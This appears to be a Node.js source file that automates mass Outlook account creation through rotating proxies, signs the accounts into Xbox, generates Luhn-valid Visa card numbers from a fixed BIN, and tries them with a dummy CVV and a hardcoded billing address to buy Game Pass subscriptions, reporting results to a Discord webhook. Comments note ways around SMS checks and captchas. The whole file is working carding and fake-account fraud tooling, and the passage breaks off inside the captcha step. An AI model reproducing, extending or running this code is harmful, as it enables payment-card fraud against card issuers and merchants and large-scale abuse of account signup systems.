const request = require('request')
const fs = require('fs')
const random_name = require('node-random-name');
const genCipher = require('./cipher');
const password = require('secure-random-password');
const colors = require('colors')
const { Webhook, MessageBuilder } = require('discord-webhook-node'); 
const setCookie = require('set-cookie-parser');
process.on('unhandledRejection', (err, p) => {});
function generateValidCard(bin, length) {
	var cardNumber = generate(bin, length),
		luhnValid = luhnChk(cardNumber),
		counter = 0;
	while (!luhnValid) {
		cardNumber = generate(bin, length);
		luhnValid = luhnChk(cardNumber);
		counter++;
	}
	return cardNumber;
}

function generate(bin, length) {
    var cardNumber = bin,
        randomNumberLength = length - (bin.length + 1);
    for (var i = 0; i < randomNumberLength; i++) {
        var digit = Math.floor((Math.random() * 9) + 0);
        cardNumber += digit;
    }
	var checkDigit = getCheckDigit(cardNumber);
	cardNumber += String(checkDigit);
    return cardNumber;
}

function getCheckDigit(number) {
    var sum = 0,
        module,
        checkDigit;
    for (var i = 0; i < number.length; i++) {
        var digit = parseInt(number.substring(i, (i + 1)));
        if ((i % 2) == 0) {
            digit = digit * 2;
            if (digit > 9) {
                digit = (digit / 10) + (digit % 10);
            }
        }
        sum += digit;
    }
    module = parseInt(sum) % 10;
    checkDigit = ((module === 0) ? 0 : 10 - module);
    return checkDigit;
}

/**
 * check luhn shit
 */
var luhnChk = (function (arr) {
    return function (ccNum) {
        var 
            len = ccNum.length,
            bit = 1,
            sum = 0,
            val;

        while (len) {
            val = parseInt(ccNum.charAt(--len), 10);
            sum += (bit ^= 1) ? arr[val] : val;
        }

        return sum && sum % 10 === 0;
    };
}([0, 2, 4, 6, 8, 1, 3, 5, 7, 9]));

class Outlook {
    constructor(task) {
        this.id = task.id + 1
        this.webhook = new Webhook(task.webhook)
        this.captchaLimit = task.limit
        this.key = task.key
        const rawProx = task.proxyList

        this.proxies = []

        rawProx.forEach(raw => {
            let split = raw.split(':');
			if (split.length > 2) {
				this.proxies.push(`http://${raw}`);
			} else {
				this.proxies.push(`http://${split[0]}:${split[1]}`);
			}
        })

        let email = random_name().replace(' ','')
        this.email = email.toLowerCase() + this.rNum(1, 100000).toString()
        this.pw = this.randPw()
        this.jar = request.jar()
        this.proxy = this.proxies[this.rNum(0, this.proxies.length - 1)]
        
        this.capSolves = 0

        this.genData()
    }

    async controller(step) {
        try {
            const nextStep = await this[step]();
			this.controller(nextStep);
        } catch (error) {
            try {
                this.controller(error.nextStep || step);
            } catch (e) {
                await this.stop()
            }
        }
    }

    start() {   
        this.controller('getIp')
    }

    stop() {
        this.status(`Stopped`, 'Warn');
    }

    getIp() {
        return new Promise((resolve, reject) => {
            request('https://api.ipify.org', {method: "GET", proxy: this.proxy}, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "loadSite"})
                } else {
                    this.ip = body
                    // Used for debugging the proxy in the webhook
                    resolve('loadSite')
                }
            });
        })
    }

    loadSite() {
        return new Promise((resolve, reject) => {
            const opts = {
                method: "GET",
                jar: this.jar, gzip: true,
                proxy: this.proxy       
			}
        
            request('https://signup.live.com/signup', opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "loadSite"})
                } else {
                    this.outlookData.redir = res.request.uri.href
                    resolve('loadRedir')
                }
            })

        })
    }
	
	//
    loadRedir() {
        return new Promise((resolve, reject) => {
            const opts = {
                method: "GET",
                jar: this.jar, gzip: true,
                proxy: this.proxy
			}        
            request(this.outlookData.redir, opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "loadSite"})
                } else {
					try {
						this.outlookData.uaid = this.outlookData.redir.split('uaid=')[1].split('&')[0]
						let tcxt = body.split('"clientTelemetry":{"uaid":"')[1].split(',"tcxt":"')[1].split('"},')[0]
						this.outlookData.tcxt = tcxt.replaceAll(`\\u002f`, "/").replaceAll(`\\u003a`, ":").replaceAll(`\\u0026`, "&").replaceAll(`\\u003d`, "=").replaceAll(`\\u002b`, "+")
			
						let canary = body.split('"apiCanary":"')[1].split('"')[0]
						this.outlookData.canary = canary.replaceAll(`\\u002f`, "/").replaceAll(`\\u003a`, ":").replaceAll(`\\u0026`, "&").replaceAll(`\\u003d`, "=").replaceAll(`\\u002b`, "+")
			
						this.outlookData.randomNum = body.split(`var randomNum="`)[1].split(`"`)[0]
						this.outlookData.key = body.split(`var Key="`)[1].split(`"`)[0]
			
						this.outlookData.SKI = body.split(`var SKI="`)[1].split(`"`)[0]
						resolve('main')
					} catch (e) {
						reject({msg: err, nextStep: "loadSite"})	
					}
				}
            })
        })
    }
	
	msLogin() {
		return new Promise((resolve, reject) => {
            const opts = {
                method: "GET",
                jar: this.jar, gzip: true,
                proxy: this.proxy
			}        
			
            request('https://account.xbox.com/en-us/accountcreation?returnUrl=https:%2f%2fwww.xbox.com%2fen-US%2fxbox-game-pass%3flaunchStore%3dCFQ7TTC0KHS0%23join&rtc=1', opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msLogin"})
                } else {
					try {
						this.ppft = body.split(`sFTTag:'<input type="hidden" name="PPFT" id="i0327" value="`)[1].split('"')[0]
						this.urlRedir = body.split("urlPost:'")[1].split("'")[0]
						resolve('msLoginStage2')
					} catch (err) {
						reject({msg: err, nextStep: "msLogin"})
					}
				}
            })
        })
	}
	
	msLoginStage2() {
        return new Promise((resolve, reject) => {
			const form = {
				"i13": "0",
				"login": `${this.email}@outlook.com`,
				"loginfmt": `${this.email}@outlook.com`,
				"type": "11",
				"LoginOptions": "3",
				"lrt": "",
				"lrtPartition": "",
				"hisRegion": "",
				"hisScaleUnit": "",
				"passwd": this.pw,
				"ps": "2",
				"psRNGCDefaultType": "",
				"psRNGCEntropy": "",
				"psRNGCSLK": "",
				"canary": "",
				"ctx": "",
				"hpgrequestid": "",
				"PPFT": this.ppft,
				"PPSX": "Passport",
				"NewUser": "1",
				"FoundMSAs": "",
				"fspost": "0",
				"i21": "0",
				"CookieDisclosure": "0",
				"IsFidoSupported": "1",
				"isSignupPost": "0",
				"i19": "20559"
			}
            const opts = {
				form: form,
                method: "POST",
                jar: this.jar, gzip: true,
                proxy: this.proxy
			}        
			
            request(this.urlRedir, opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msLoginStage2"})
                } else {
					this.ppft2 = body.split("sFT:'")[1].split("'")[0]
					this.redir2 = body.split("urlPost:'")[1].split("'")[0]
					resolve('msLoginStage3')
				}
            })
        })
    }
	
	msLoginStage3() {
        return new Promise((resolve, reject) => {
			const form = {
				"LoginOptions": "3",
				"type": "28",
				"ctx": "",
				"hpgrequestid": "",
				"PPFT": this.ppft2,
				"i19": "19130"
			}
            const opts = {
				form: form,
                method: "POST",
                jar: this.jar, gzip: true,
                proxy: this.proxy
			}
            request(this.redir2, opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msLoginStage3"})
                } else {
					try {
						this.fmHF = body.split('id="fmHF" action="')[1].split('"')[0]
						this.pprid = body.split('id="pprid" value="')[1].split('"')[0]
						this.nap = body.split('id="NAP" value="')[1].split('"')[0]
						this.anon = body.split('id="ANON" value="')[1].split('"')[0]
						this.t = body.split('id="t" value="')[1].split('"')[0]
						resolve('msLoginStage4')
					} catch (err) {
						reject({msg: err, nextStep: "msLoginStage3"})
					}
				}
            })
        })
    }
	
	msLoginStage4() {
        return new Promise((resolve, reject) => {
			const form = {
				"pprid": this.pprid,
				"NAP": this.nap,
				"ANON": this.anon,
				"t": this.t
			}
            const opts = {
				form: form,
                method: "POST",
                jar: this.jar, gzip: true,
                proxy: this.proxy,
			}
            request(this.fmHF, opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msLoginStage4"})
                } else {
					this.href69 = res.request.uri.href
					resolve('msLoginStage5')
				}
            })
        })
	}
	
	msLoginStage5() {
        return new Promise((resolve, reject) => {
            const opts = {
                method: "POST",
                jar: this.jar, gzip: true,
                proxy: this.proxy
			}
            request(this.href69, opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msLoginStage5"})
                } else {
					this.href69 = res.request.uri.href
					resolve('msLoginStage6')
				}
            })
        })
	}
	
	msLoginStage6() {
		return new Promise((resolve, reject) => {
            const opts = {
                method: "GET",
                jar: this.jar, gzip: true,
                proxy: this.proxy,
				gzip: true
			}
            request(this.href69, opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msLoginStage6"})
                } else {
					try {
						this.fmHF = body.split('id="fmHF" action="')[1].split('"')[0]
						this.pprid = body.split('id="pprid" value="')[1].split('"')[0]
						this.nap = body.split('id="NAP" value="')[1].split('"')[0]
						this.anon = body.split('id="ANON" value="')[1].split('"')[0]
						this.t = body.split('id="t" value="')[1].split('"')[0]
						resolve('msLoginStage7')
					} catch (err) {
						reject({msg: err, nextStep: "msLoginStage6"})
					}
				}
            })
        })
	}
	
		
	msLoginStage7() {
		const form = {
			"pprid": this.pprid,
			"NAP": this.nap,
			"ANON": this.anon,
			"t": this.t
		}
		return new Promise((resolve, reject) => {
            const opts = {
                method: "POST",
                jar: this.jar, gzip: true,
                proxy: this.proxy,
				form: form,
				gzip: true
			}
            request(this.fmHF, opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msLoginStage7"})
                } else {
					try {
						this.XDXD = body.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
						resolve('msLoginStage8')
					} catch (err) {
						reject({msg: err, nextStep: "loadSite"})
					}
				}
            })
        })
	}
	
	
	msLoginStage8() {
        return new Promise((resolve, reject) => {
			const form = {
				"partnerOptInChoice": "false",
				"msftOptInChoice": "false",
				"isChild": "true",
				"returnUrl": "https://www.xbox.com/en-US/?lc=1033"
			}
            const opts = {
				form,
                method: "POST",
                jar: this.jar, gzip: true,
                proxy: this.proxy,
				headers: {
					"__RequestVerificationToken": this.XDXD
				}
			}
            request('https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount', opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msLoginStage8"})
                } else {
					resolve('msLoginStage9')
				}
            })
        })
    }
	
	msLoginStage9() {
		return new Promise((resolve, reject) => {
            const opts = {
                method: "GET",
                jar: this.jar,
			}
            request('https://account.xbox.com/en-us/xbox/accountsignin?returnUrl=https%3a%2f%2fwww.xbox.com%2fen-AU%2fgames%2fstore%2fpc-game-pass%2fcfq7ttc0kgq8%2f0002', opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msLoginStage9"})
                } else {
					try {
						const cookies = setCookie.parse(this.jar.getCookieString("https://account.xbox.com/en-us/xbox/accountsignin?returnUrl=https%3a%2f%2fwww.xbox.com%2fen-AU%2fgames%2fstore%2fpc-game-pass%2fcfq7ttc0kgq8%2f0002"), {
							decodeValues: true
						});
						for (var cookie of cookies) {
							if (cookie['xbxxtkhttp://mp.microsoft.com/']) {
								const val = cookie['xbxxtkhttp://mp.microsoft.com/'];
								const uhs = val.split('%22uhs%22%3a%22')[1].split('%22')[0];
								const token = val.split('%7b%22Token%22%3a%22')[1].split('%22')[0];
								this.msAuth = `XBL3.0 x=${uhs};${token}`;
								this.msAuth2 = {"XToken":`XBL3.0+x=${uhs};${token}`};
								this.token2XD = uhs;
								this.tokenXD = token;
							}
						}
						resolve('msBuy')
					} catch (err) {
						reject({msg: err, nextStep: "msLoginStage9"})
					}
				}
            })
        });
	}
	//
	
	msBuy() {
		return new Promise((resolve, reject) => {
			this.msBuyTries = 0;
			this.card = generateValidCard("413022001143", 16);
            this.status('Trying CC: **' + this.card.substring(12), 'Status')
			const form = {
				data: this.card
			}
			const opts = {
				json: form,
                method: "POST",
                jar: this.jar, gzip: true,
                proxy: this.proxy,
			}
            request('https://tokenization.cp.microsoft.com/tokens/pan/getToken', opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msBuy"})
                } else {
					this.cardID = body.data;
					resolve('msBuyStage2')
				}
            })
        })
	}
	
	msBuyStage2() {
		return new Promise((resolve, reject) => {
			const form = {
				data: "000"
			}
			const opts = {
				json: form,
                method: "POST",
                jar: this.jar,
				gzip: true,
                proxy: this.proxy,
			}
            request('https://tokenization.cp.microsoft.com/tokens/cvv/getToken', opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msBuyStage2"})
                } else {
					this.cvvID = body.data;
					resolve('msBuyStage3')
				}
            })
        })
	}

	msBuyStage3() {
		return new Promise((resolve, reject) => {
			const form = {
				"context": "purchase",
				"details": {
					"accountHolderName": "Dort Gen",
					"accountToken": this.cardID,
					"address": {
						"address_line1": "2710 English Ivy Ct",
						"addressCountry": "us",
						"addressOperation": "add",
						"addressType": "billing",
						"city": "Longwood",
						"country": "us",
						"postal_code": "32779",
						"region": "fl"
					},
					"cvvToken": this.cvvID,
					"dataCountry": "us",
					"dataOperation": "add",
					"dataType": "credit_card_visa_details",
					"expiryMonth": "9",
					"expiryYear": "2022",
					"permission": {
						"dataCountry": "us",
						"dataOperation": "add",
						"dataType": "permission_details",
						"hmac": {
							"algorithm": "hmacsha256",
							"data": "fWRHCOoW5IzGvqp2WwcO4fxfPnnTi0u3v85e8kshEXI=",
							"keyToken": "SJhj2d96g/cZByDCAf8XGDJYSbupAsvzn1Q1akBw2og="
						},
					},
					"userCredential": this.msAuth
				},
				"paymentMethodCountry": "us",
				"paymentMethodFamily": "credit_card",
				"paymentMethodOperation": "add",
				"paymentMethodResource_id": "credit_card.visa",
				"paymentMethodType": "visa",
				"pxmac": "F4CB7D8A885A925634F4820E129CE3F62455B83F584BCC8FC5DA5F8BB1C9A762",
				"riskData": {
					"dataCountry": "us",
					"dataOperation": "add",
					"dataType": "payment_method_riskData",
					"greenId": "6d6eb12f-bd98-4208-9b55-840b41a693a9"
				},
				"sessionId": "f8438437-f3cf-6274-c386-df38a17e7ff5"
			}
			const opts = {
				json: form,
				method: "POST",
				jar: this.jar,
				gzip: true,
				proxy: this.proxy,
				headers: {
					"authorization": this.msAuth.replace("+", " "),
					"correlation-context": "v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId=V7SmguoWfeu79xdfaX5Iji",
					"x-ms-pidlsdk-version": "1.20.2_reactview",
					"ms-cv": "V7SmguoWfeu79xdfaX5Iji.17.11"
				}
			}
			request('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?country=us&language=en-AU&partner=webblends&completePrerequisites=True', opts, (err, res, body) => {
				if (err) {
					reject({msg: err, nextStep: "msBuyStage3"})
				} else {
					if (body.code && body.code === 'BadRequest') {
						reject({msg: err, nextStep: this.msBuyTries++ > 3 ? "msBuy" : "msBuyStage3"})
					} else {
						if (body.id) {
							this.paymentID = body.id;
							this.accountID = body.accountId;
							this.status("Linked: " + this.email + "@outlook.com")
							resolve('msAddress');
						} else {
							reject({msg: err, nextStep: this.msBuyTries++ > 3 ? "msBuy" : "msBuyStage3"})	
						}
					}
				}
			});
		});
	}

	msAddress() {
		return new Promise((resolve, reject) => {
			const url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/addressesEx?partner=webblends&language=en-US&avsSuggest=true"
			const form = {"addressType":"billing","addressCountry":"us","address_line1":"2710 English Ivy Ct","city":"Longwood","region":"fl","postal_code":"32779","country":"us","set_as_default_billing_address":"True"}
			const opts = {
				json: form,
				method: "POST",
				jar: this.jar,
				proxy: this.proxy,
				gzip: true,
				headers: {
					"authorization": this.msAuth.replace("+", " "),
					"correlation-context": "v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId=V7SmguoWfeu79xdfaX5Iji",
					"x-ms-pidlsdk-version": "1.20.2_reactview",
					"ms-cv": "V7SmguoWfeu79xdfaX5Iji.17.11"
				}
			}
            request(url, opts, (err, res, body) => {
                if (err) {
                    reject({msg: err, nextStep: "msAddress"})
                } else {
					this.addyID = body.id;
					this.customerID = body.customer_id;
					resolve('msBuyStage4')
				}
            })

		});
	}

	s4() {
		return Math.floor((Math.random() + 1) * 0x10000).toString(16).substring(1);
	}
	
	guid() {
		//POV: microsoft code
		return this.s4() + this.s4() + "-" + this.s4() + "-" + this.s4() + "-" + this.s4() + "-" + this.s4() + this.s4() + this.s4();
	}

	msBuyStage4() {
		return new Promise((resolve, reject) => {
			const url = "https://www.microsoft.com/store/buynow?ms-cv=sVd8Vmn%2Bn8m%2Bt%2BoPy%2F16qm.29&noCanonical=true&market=US&locale=en-US";
			const form = {
				data: {"products":[{"productId":"CFQ7TTC0KGQ8","skuId":"0002","availabilityId":"CFQ7TTC0KCPV"}],"campaignId":"xboxcomct","callerApplicationId":"XboxCom","expId":["EX:EX:xbcexpidtestcf","EX:sc_xboxgamepad","EX:sc_xboxspinner","EX:sc_xboxclosebutton"],"flights":["sc_xboxgamepad","sc_xboxspinner","sc_xboxclosebutton"],"clientType":"XboxCom","data":{"usePurchaseSdk":true},"layout":"Modal","cssOverride":"XboxCom2","theme":"dark","scenario":""},
				auth: this.msAuth2
			}
			const opts = {
				form: `data=%7B%22products%22%3A%5B%7B%22productId%22%3A%22CFQ7TTC0KGQ8%22%2C%22skuId%22%3A%220002%22%2C%22availabilityId%22%3A%22CFQ7TTC0KCPV%22%7D%5D%2C%22campaignId%22%3A%22xboxcomct%22%2C%22callerApplicationId%22%3A%22XboxCom%22%2C%22expId%22%3A%5B%22EX%3AEX%3Axbcexpidtestcf%22%2C%22EX%3Asc_xboxgamepad%22%2C%22EX%3Asc_xboxspinner%22%2C%22EX%3Asc_xboxclosebutton%22%5D%2C%22flights%22%3A%5B%22sc_xboxgamepad%22%2C%22sc_xboxspinner%22%2C%22sc_xboxclosebutton%22%5D%2C%22clientType%22%3A%22XboxCom%22%2C%22data%22%3A%7B%22usePurchaseSdk%22%3Atrue%7D%2C%22layout%22%3A%22Modal%22%2C%22cssOverride%22%3A%22XboxCom2%22%2C%22theme%22%3A%22dark%22%2C%22scenario%22%3A%22%22%7D&auth=%7B%22XToken%22%3A%22XBL3.0+x%3D${this.token2XD}%3B${this.tokenXD}%22%7D`,
				method: "POST",
				jar: this.jar,
				proxy: this.proxy,
				gzip: true,
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
					"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
				}
			}
			request(url, opts, (err, res, body) => {
				if (err) {
              		reject({msg: err, nextStep: "msBuyStage4"})
				} else {
                    try {
						this.muid = body.split('"muid":"')[1].split('"')[0]
						this.riskId = body.split('"riskId":"')[1].split('"')[0]
						this.cartID = body.split('"cartId":"')[1].split('"')[0]
						this.sessionID = body.split('"sessionId":"')[1].split('"')[0]
						resolve('msBuyStage5')
					} catch (err) {
                    	reject({msg: err, nextStep: "msBuyStage4"})
					}
				}
			})
		});
	}
	
	msBuyStage5() {
		return new Promise((resolve, reject) => {
			const form = {
				"paymentSessionId":this.sessionID,
				"cartId": this.cartID,
				"friendlyName": null,
				"market": "US",
				"locale": "en-US",
				"catalogClientType": "",
				"riskSessionId": this.riskId,
				"testScenarios": "None",
				"callerApplicationId": "_CONVERGED_XboxCom",
				"paymentMethodFamily": "credit_card",
				"paymentMethodResource_id": "credit_card.visa",
				"paymentMethodType": "visa",
				"clientContext": {
					"client": "XboxCom",
					"deviceFamily": "Web"
				},
				"refreshPrimaryPaymentOption": false,
				"flights": [
					"sc_showmuid",
					"sc_newpagetitle",
					"sc_trackinitialcheckoutload",
					"sc_passthroughculture",
					"sc_defaultshippingref",
					"sc_buynowctatext",
					"sc_redeemperf",
					"sc_custombuynowbutton",
					"sc_updatebillinginfo",
					"sc_sendonedsxboxbuynowtelemetry",
					"sc_useanchorcomponent",
					"sc_filterasyncpisforgifting",
					"sc_handleentitlementerror",
					"sc_updateresourcefix",
					"sc_allowpaysafecard",
					"sc_newduplicatesubserror",
					"sc_dimealipaystylingfix",
					"sc_sendonedsmscombuynowtelemetry",
					"sc_paymentmethodfamilyfix",
					"sc_preparecheckoutperf",
					"sc_redirecttosignin",
					"sc_xboxoos",
					"sc_purchasedblocked",
					"sc_custombuynowcheckbox",
					"sc_outofstock",
					"sc_hideneedhelp",
					"sc_orderstatushint",
					"sc_officebeta",
					"sc_xboxredirection",
					"sc_dynamicseligibility",
					"sc_fixcolorcontrastforcheckout",
					"sc_contextpreparecheckout",
					"sc_fixcolorcontrastforrecommendeditems",
					"sc_resellerdetail",
					"sc_checkoutloadingblur",
					"sc_newspinneroverlay",
					"sc_errorpageviewfix",
					"sc_allowelo",
					"sc_checkoutvalidateaddress",
					"sc_newmovielegalstrings",
					"sc_bankchallenge",
					"sc_exceptionfixofficedime",
					"sc_alwayscartmuid",
					"sc_koreanlegalterms",
					"sc_usebuynowonlyinternalendpoint",
					"sc_routebacktocartforoutofstock",
					"sc_promocodefeature-web-desktop",
					"sc_checkoutsmd",
					"sc_exceptionfixcart",
					"sc_addpiriskdata",
					"sc_dcccattwo",
					"sc_ordercheckoutfix",
					"sc_addsitename",
					"sc_paymentoptionnotfound",
					"sc_buynowuipreload",
					"sc_allowverve",
					"sc_turnoffmwfbuynow",
					"sc_skipsetdefaultpaymentoption",
					"sc_valenciaupgrade",
					"sc_satisfiedcheckout",
					"sc_optionalcatalogclienttype",
					"sc_exceptionfixbuybowweb",
					"sc_loweroriginalprice",
					"sc_shippingallowlist",
					"sc_ordereditforincompletedata",
					"sc_eligibilityapi",
					"sc_expanded.purchasespinner",
					"sc_paymentpickeritem",
					"sc_uuid",
					"sc_newdateformat",
					"sc_optimizecheckoutload",
					"sc_mwfbuynow",
					"sc_useofficeonlyinternalendpoint",
					"sc_preparecheckoutrefactor",
					"sc_logitemstoadd",
					"sc_greenshipping",
					"sc_exceptionfix",
					"sc_extendPageTagToOverride",
					"sc_purchasedblockedby",
					"sc_hipercard",
					"sc_enablelegalrequirements",
					"sc_hidewarningevents",
					"sc_purchaseblock",
					"sc_xboxgotocart",
					"sc_rspv2",
					"sc_disableshippingaddressinit",
					"sc_renewtreatmenta",
					"sc_trimerrorcode",
					"sc_headingheader",
					"sc_abandonedretry",
					"sc_checkoutorderedpv",
					"sc_currencyformattingpkg",
					"sc_newdeliverymsg",
					"sc_showooserrorforoneminute",
					"sc_newcheckoutstyle",
					"sc_sameaddressdefault",
					"sc_railv2",
					"sc_activitymonitorasyncpurchase",
					"sc_totalpricefix",
					"sc_entitlementcheckallitems",
					"sc_subscriptioncanceldisclaimer",
					"sc_checkoutfreeitemfix",
					"sc_psd2forcheckout",
					"sc_sendonedsofficebuynowtelemetry",
					"sc_newdemandsandneedsstatement",
					"sc_migrationforcitizenspay",
					"sc_exceptionfixofficecom",
					"sc_koreatransactionfee",
					"sc_showlegalstringforproducttypepass",
					"sc_removesetpaymentmethod",
					"sc_flexsubs",
					"sc_partnernametelemetry",
					"sc_allowmpesapi",
					"sc_reactcheckout",
					"sc_citizensoneallowed",
					"sc_hideeditbuttonwhenediting",
					"sc_usebuynowonlynonprodendpoint",
					"sc_xboxcomnosapi",
					"sc_hidecontactcheckbox",
					"sc_showminimalfooteroncheckout",
					"sc_officescds",
					"sc_onedstelemetry",
					"sc_returnoospsatocart",
					"sc_skipselectpi",
					"sc_buynowuiprod",
					"sc_trialtreatmenta",
					"sc_enablekakaopay",
					"sc_addpaymentfingerprinttagging",
					"sc_updatedfamilystrings",
					"sc_riskfatal",
					"sc_checkoutcontainsiaps",
					"sc_newlegaltextlayout",
					"sc_loadtestheadersenabled",
					"sc_disablefilterforuserconsent",
					"sc_selectpmonaddfailure",
					"sc_hidexdledd",
					"sc_removemoreless",
					"sc_enablezipplusfour",
					"sc_checkoutasyncpurchase",
					"sc_checkoutloadspinner",
					"sc_promocode",
					"sc_postorderinfolineitemmessage",
					"sc_lineitemactionfix",
					"sc_leaficons",
					"sc_inpageaddpifailure",
					"sc_allowedpisenabled",
					"sc_checkoutdowngrade",
					"sc_paymentinstrumenttypeandfamily",
					"sc_newooslogiconcart",
					"sc_showvalidpis",
					"sc_riskyxtoken",
					"sc_fullpageredirectionforasyncpi",
					"sc_protectionplanstrings",
					"sc_buynowusagerules",
					"sc_klarna",
					"sc_ineligibletostate",
					"sc_multiplesubscriptions",
					"sc_testflightbuynow",
					"sc_exceptionfixxboxcom",
					"sc_zipplusfourselectaddress",
					"sc_keepprtoadd",
					"sc_emptyresultcheck",
					"sc_disabledpaymentoption",
					"sc_delayretry",
					"sc_checkoutklarna",
					"sc_onedrivedowngrade",
					"sc_cleanreducercode",
					"sc_skippurchaseconfirm",
					"sc_eligibilityproducts",
					"sc_checkoutentitlement",
					"sc_newshippingmethodtelemetry",
					"sc_inlinetempfix",
					"sc_postmessageforesckey",
					"sc_xdlshipbuffer",
					"sc_focustrapforgiftthankyoupage",
					"sc_localizedtax",
					"sc_xboxgamepad",
					"sc_xboxspinner",
					"sc_xboxclosebutton"
				],
				"isBuyNow": true,
				"isGift": false,
				"paymentSessionId": this.sessionID,
				"buyNowScenario": "",
				"primaryPaymentInstrumentId": this.paymentID
			}
			const opts = {
				json: form,
				method: "POST",
				jar: this.jar,
				gzip: true,
				proxy: this.proxy,
				headers: {
					"authorization": this.msAuth.replace("+", " "),
					"correlation-context": "v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId=V7SmguoWfeu79xdfaX5Iji",
					"x-ms-pidlsdk-version": "1.20.2_reactview",
					"ms-cv": "V7SmguoWfeu79xdfaX5Iji.17.11",
					"X-MS-Correlation-ID": "40481550-f19f-44d8-9dfd-8c3db9eead4f",
					"X-MS-Tracking-Id": "d59389ca-d163-4126-820f-2e293390a87f",
					"X-MS-Vector-Id": "1EE7F16B9311B139C46E4DDD0305AFDB89138B2AE481BF3F567B174EA68E4237",
					"X-Authorization-Muid": this.muid					
				}
			}
			request("https://cart.production.store-web.dynamics.com/cart/v1.0/Cart/purchase?appId=BuyNow", opts, (err, res, body) => {
				if (err) {
					reject({msg: err, nextStep: "msBuyStage5"})
				} else {
					console.log(JSON.stringify(body))
					if (body && body.readyToPurchase) { // it can be undefined	if it failed, don't remove					
						resolve('sendWhook');
					} else {
						reject({msg: err, nextStep: "msBuy"})
					}
				}
			});
		});
	}

    main() {
        return new Promise((resolve, reject) => {
			this.poop = 0;
            if (this.outlookData.solved) {
                this.outlookData.body = this.genSolvedBody()
            } else {
                this.outlookData.body = this.genBody()
            }
            const outlookheaders = {
                "accept": "application/json",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "canary": this.outlookData.canary,
                "content-type": "application/json",
                "dnt": "1",
                "hpgid": "2006" + this.rNum(10,99).toString(),
                "origin": "https://signup.live.com",
                "pragma": "no-cache",
                "referer": this.outlookData.redir,
                "scid": "100118",
                "sec-ch-ua": `" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "tcxt": this.outlookData.tcxt,
                "uaid": this.outlookData.uaid,
                "uiflvr": "1001",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
                "x-ms-apitransport": "xhr",
                "x-ms-apiversion": "2"
            }

            const opts = {
                body: JSON.stringify(this.outlookData.body),
                headers: outlookheaders,
                method: "POST",
                jar: this.jar, gzip: true,
                proxy: this.proxy
			}
            
        
            request(`https://signup.live.com/API/CreateAccount?lic=1&uaid=${this.outlookData.uaid}`, opts, (err, res, body) => {
                if (err) {
					if (this.poop < 5) {
						resolve("main");
					} else {
						reject({msg: "failed to signup", timeout: 10000, nextStep: "loadSite"})
					}
					this.poop++;
                } else {
                    try {
                        let loginResp = JSON.parse(body).error
                        if (!loginResp || loginResp == undefined) {
                            this.status(`Created account: ${this.email}@outlook.com:${this.pw}`, 'Success')
							resolve('msLogin')
                        } else {
                            if (loginResp.code == "1042") {
                                // TODO: Add sms support
                                // rn redoing this step on timeout seems to bypass sms required, but 
                                // good idea to add support
                                reject({msg: "Flagged proxy, sms required", timeout: 10000})
                            } else if (loginResp.code == "1041") {
                                this.outlookData.encAttemptToken = loginResp.data.split(`encAttemptToken":"`)[1].split(`"`)[0].replaceAll(`\\u002f`, "/").replaceAll(`\\u003a`, ":").replaceAll(`\\u002b`, "+").replaceAll(`\\u0026`, "&").replaceAll(`\\u003d`, "="); 
                                this.outlookData.dfpRequestId = loginResp.data.split(`dfpRequestId":"`)[1].split(`"`)[0];
								resolve('loadCaptcha')
                            } else if (loginResp.code == "1043") {
                                this.rotateProxy()
                                this.outlookData.solved = false
                                this.jar = request.jar()
                                reject({msg: `Bad captcha submission, restarting session (${this.proxy})`, nextStep: "loadSite"})
                                print('fail')
                                print(this.outlookData.solve)
                            } else {             
                                // TODO: add more error codes

                                // reject({msg: `Error code: ${loginResp.code}`})})                   
                                reject({msg: `Unforseen response: ${body}`, type: 'Info', nextStep: 'loadSite'})
                            }
                        }
                    } catch (e) {
                        reject({msg: e, nextStep: 'loadSite'})
                    }
                }
            })
        })
    }

    loadCaptcha() {
		return new Promise((resolve, reject) => {
			// try {
			// 	solver.funCaptcha("B7D8911C-5CC8-A9A3-35B0-554ACEE604DA", `https://signup.live.com/signup?uaid=${this.outlookData.uaid}`).then(resp => {
	  //   	    	this.outlookData.solve = resp.data;
			// 		this.outlookData.solved = true;
			// 		console.log(resp);
		 //        	this.controller('main');
			// 	}).catch(err => {
